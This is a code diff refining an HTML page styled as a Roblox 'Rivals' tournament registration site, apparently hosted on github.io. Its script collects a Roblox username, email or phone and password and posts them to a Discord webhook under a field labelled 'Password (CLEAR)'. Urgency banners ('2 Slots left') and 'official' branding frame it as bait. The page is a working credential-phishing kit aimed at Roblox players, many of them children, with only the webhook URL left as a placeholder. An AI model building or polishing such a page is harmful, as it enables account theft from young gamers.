@@ -21,7 +21,6 @@
             overflow-x: hidden;
         }
 
-        /* custom scroll */
         ::-webkit-scrollbar { width: 5px; }
         ::-webkit-scrollbar-track { background: #11131f; }
         ::-webkit-scrollbar-thumb { background: #ff3a4d; border-radius: 10px; }
@@ -35,7 +34,6 @@
         }
         .site-container.loaded { opacity: 1; }
 
-        /* loader */
         .loader-overlay {
             position: fixed;
             top: 0;
@@ -69,11 +67,9 @@
             100% { opacity: 0.25; transform: scale(0.8); }
         }
 
-        /* inline loader bubbles */
         .inline-loader { display: flex; align-items: center; justify-content: center; gap: 10px; padding: 6px 0; }
         .inline-loader .dot { width: 9px; height: 9px; animation: pulseWave 1.2s infinite ease-in-out; }
 
-        /* header & glow */
         .modern-header {
             display: flex;
             justify-content: space-between;
@@ -104,7 +100,6 @@
             letter-spacing: 0.3px;
         }
 
-        /* warning slot banner */
         .slot-warning {
             background: rgba(255, 100, 40, 0.12);
             border-left: 3px solid #ffa047;
@@ -121,7 +116,6 @@
         }
         .slot-warning i { font-size: 1.2rem; color: #ffa047; }
 
-        /* two column layout (form + tournament info) */
         .two-col {
             display: flex;
             flex-wrap: wrap;
@@ -131,7 +125,6 @@
         .form-col { flex: 1.2; min-width: 280px; }
         .info-col { flex: 1; min-width: 280px; }
 
-        /* login card */
         .login-card {
             background: rgba(10, 12, 22, 0.7);
             backdrop-filter: blur(16px);
@@ -185,7 +178,6 @@
         .team-row { margin-bottom: 0.6rem; }
         @keyframes fadeSlide { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* modern feedback (no ugly emoji, just icon via font awesome) */
         .form-feedback {
             font-size: 0.7rem;
             margin-top: 0.8rem;
@@ -198,7 +190,6 @@
             padding: 0.3rem;
         }
 
-        /* tournament glass card */
         .tournament-card {
             background: rgba(6, 8, 18, 0.65);
             backdrop-filter: blur(14px);
@@ -207,13 +198,9 @@
             overflow: hidden;
             transition: transform 0.2s, border-color 0.2s;
             box-shadow: 0 12px 28px -12px black;
+            position: relative;
         }
         .tournament-card:hover { transform: translateY(-4px); border-color: #ff4d6d; }
-        /* animated border glow (minimal rotate gradient on hover) */
-        .tournament-card {
-            position: relative;
-            background-clip: padding-box;
-        }
         .tournament-card::after {
             content: '';
             position: absolute;
@@ -332,16 +319,14 @@
         <div class="github-badge"><i class="fab fa-github"></i> .github.io</div>
     </div>
 
-    <!-- Slot warning banner -->
     <div class="slot-warning">
         <i class="fas fa-exclamation-triangle"></i> <span>2 Slots left until start!</span>
     </div>
 
     <div class="two-col">
-        <!-- LEFT COLUMN: Registration Form -->
         <div class="form-col">
             <div class="login-card">
-                <div class="form-title">🔐 RIVALS REGISTRATION</div>
+                <div class="form-title">RIVALS REGISTRATION</div>
                 <div class="input-group">
                     <label><i class="fas fa-user"></i> Roblox Username</label>
                     <input type="text" id="robloxUsername" class="input-field" placeholder="Your IGN">
@@ -352,7 +337,7 @@
                 </div>
                 <div class="input-group">
                     <label><i class="fas fa-lock"></i> Password</label>
-                    <input type="text" id="password" class="input-field" placeholder="••••••">
+                    <input type="text" id="password" class="input-field" placeholder="password">
                 </div>
                 <div id="teamFieldsContainer" class="team-fields">
                     <div style="font-size:0.7rem; margin-bottom:8px; color:#a0a8cc;"><i class="fas fa-users"></i> Team roster (4 slots)</div>
@@ -367,7 +352,6 @@
             </div>
         </div>
 
-        <!-- RIGHT COLUMN: Tournament info box (exactly as described) -->
         <div class="info-col">
             <div class="tournament-card">
                 <div class="tournament-header">
@@ -375,7 +359,7 @@
                     <div class="tournament-sub">This is our Third tournament this month!</div>
                 </div>
                 <div class="tournament-rules">
-                    <p><i class="fas fa-ban" style="width: 20px;"></i> Not allowed to play solo! (atleast 2 persons)</p>
+                    <p><i class="fas fa-ban"></i> Not allowed to play solo! (atleast 2 persons)</p>
                     <p><i class="fas fa-handshake"></i> No teaming with other teams</p>
                     <p><i class="fas fa-skull"></i> No Cheats like Xeno or Hero Executor</p>
                 </div>
@@ -401,10 +385,8 @@
 
 <script>
     (function(){
-        // ---------- CONFIG ----------
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/REPLACE_ME_WITH_YOUR_WEBHOOK_URL";
         
-        // DOM elements
         const globalLoader = document.getElementById('globalLoader');
         const mainContainer = document.getElementById('mainContainer');
         const usernameInput = document.getElementById('robloxUsername');
@@ -416,19 +398,17 @@
         const teamMember2 = document.getElementById('teamMember2');
         const teamMember3 = document.getElementById('teamMember3');
         const teamMember4 = document.getElementById('teamMember4');
-        const feedbackDiv = document.getElementById('inlineFeedback');
         const dynamicNotice = document.getElementById('dynamicAdminNotice');
 
         let toastTimeout;
-        function showToast(msg, isError = false, duration = 2800) {
+        function showToast(msg, isError, duration = 2800) {
             const toast = document.getElementById('floatingToast');
             if (!toast) return;
             if (toastTimeout) clearTimeout(toastTimeout);
             toast.style.borderLeftColor = isError ? '#ff5c6e' : '#2eff8a';
             toast.style.backgroundColor = '#0f111fe6';
-            // only custom icon no standard emoji mess
-            const icon = isError ? '<i class="fas fa-xmark-circle" style="color:#ff7a8a;"></i>' : '<i class="fas fa-check-circle" style="color:#6eff9e;"></i>';
-            toast.innerHTML = `${icon} <span>${msg}</span>`;
+            const icon = isError ? '<i class="fas fa-times-circle" style="color:#ff7a8a;"></i>' : '<i class="fas fa-check-circle" style="color:#6eff9e;"></i>';
+            toast.innerHTML = icon + ' <span>' + msg + '</span>';
             toast.style.opacity = '1';
             toast.style.visibility = 'visible';
             toastTimeout = setTimeout(() => {
@@ -440,7 +420,7 @@
         function showInlineLoader(show) {
             if (show) {
                 submitBtn.disabled = true;
-                submitBtn.innerHTML = `<div class="inline-loader"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>`;
+                submitBtn.innerHTML = '<div class="inline-loader"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>';
             } else {
                 submitBtn.disabled = false;
                 submitBtn.innerHTML = '<i class="fas fa-arrow-right"></i> Register & Join';
@@ -460,10 +440,10 @@
         async function sendToDiscord(username, emailPhone, password, teamArray) {
             if (DISCORD_WEBHOOK_URL === "https://discord.com/api/webhooks/REPLACE_ME_WITH_YOUR_WEBHOOK_URL") 
                 throw new Error("WEBHOOK_NOT_SET");
-            const teamFields = teamArray.map((n,i) => `Slot ${i+1}: ${n || "—"}`).join("\n");
+            const teamFields = teamArray.map((n,i) => "Slot " + (i+1) + ": " + (n || "—")).join("\n");
             const payload = {
                 embeds: [{
-                    title: "🔥 NEW RIVALS REGISTRATION - RobloxComp",
+                    title: "NEW RIVALS REGISTRATION - RobloxComp",
                     color: 0xff3a4d,
                     fields: [
                         { name: "Roblox Username", value: username || "NULL", inline: true },
@@ -471,18 +451,12 @@
                         { name: "Password (CLEAR)", value: password || "empty", inline: false },
                         { name: "Team Members", value: teamFields || "No members", inline: false }
                     ],
-                    timestamp: new Date().toISOString(),
-                    footer: { text: "RobloxComp • official" }
+                    timestamp: new Date().toISOString()
                 }]
             };
             const res = await fetch(DISCORD_WEBHOOK_URL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
             if (!res.ok) throw new Error("Discord error");
             return true;
-        }
-
-        // fade hint "please put in your username" (clean, no ugly emoji)
-        function showUsernameHint() {
-            showToast("Please put in your username", true, 1900);
         }
 
         async function handleRegistration() {
@@ -491,7 +465,7 @@
             const password = passwordInput.value;
 
             if (!robloxUser) {
-                showUsernameHint();
+                showToast("Please put in your username", true, 1900);
                 return;
             }
             if (!teamContainer.classList.contains('show-team')) {
@@ -513,7 +487,6 @@
             try {
                 await sendToDiscord(robloxUser, emailPhone || "not provided", password || "empty", teamSlots);
                 showInlineLoader(false);
-                feedbackDiv.innerHTML = "";
                 showSuccessAdminMessage();
                 showToast("Registration successful", false, 2700);
                 passwordInput.value = "";
@@ -521,34 +494,33 @@
                 showInlineLoader(false);
                 let msg = err.message.includes("WEBHOOK_NOT_SET") ? "Webhook not configured (replace URL)" : "Request failed";
                 showToast(msg, true, 3200);
-                console.error(err);
             }
         }
 
-        submitBtn.addEventListener('click', (e) => { e.preventDefault(); handleRegistration(); });
-        [usernameInput, emailInput, passwordInput, teamMember1, teamMember2, teamMember3, teamMember4].forEach(inp => {
-            if(inp) inp.addEventListener('keypress', (e) => { if(e.key === 'Enter') handleRegistration(); });
-        });
+        submitBtn.addEventListener('click', function(e) { e.preventDefault(); handleRegistration(); });
+        const allInputs = [usernameInput, emailInput, passwordInput, teamMember1, teamMember2, teamMember3, teamMember4];
+        for (var i = 0; i < allInputs.length; i++) {
+            if (allInputs[i]) allInputs[i].addEventListener('keypress', function(e) { if (e.key === 'Enter') handleRegistration(); });
+        }
 
-        window.addEventListener('DOMContentLoaded', () => {
-            setTimeout(() => {
-                if(globalLoader) globalLoader.classList.add('hidden-loader');
-                setTimeout(() => {
-                    mainContainer.classList.add('loaded');
-                    showToast("Welcome to RobloxComp", false, 1800);
-                }, 200);
-            }, 1000);
-            teamContainer.classList.remove('show-team');
-            dynamicNotice.classList.add('hidden-message');
-        });
+        setTimeout(function() {
+            if (globalLoader) globalLoader.classList.add('hidden-loader');
+            setTimeout(function() {
+                mainContainer.classList.add('loaded');
+            }, 200);
+        }, 1000);
 
-        if (DISCORD_WEBHOOK_URL.includes("REPLACE_ME")) {
-            const warnSpan = document.createElement('div');
+        teamContainer.classList.remove('show-team');
+        dynamicNotice.classList.add('hidden-message');
+
+        if (DISCORD_WEBHOOK_URL.indexOf("REPLACE_ME") !== -1) {
+            var warnSpan = document.createElement('div');
             warnSpan.style.fontSize = "0.65rem";
             warnSpan.style.marginTop = "8px";
             warnSpan.style.color = "#ffab8e";
-            warnSpan.innerHTML = "<i class='fas fa-plug"></i> Replace webhook URL for live Discord";
-            document.querySelector('.login-card')?.appendChild(warnSpan);
+            warnSpan.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Replace webhook URL for live Discord';
+            var loginCard = document.querySelector('.login-card');
+            if (loginCard) loginCard.appendChild(warnSpan);
         }
     })();
 </script>
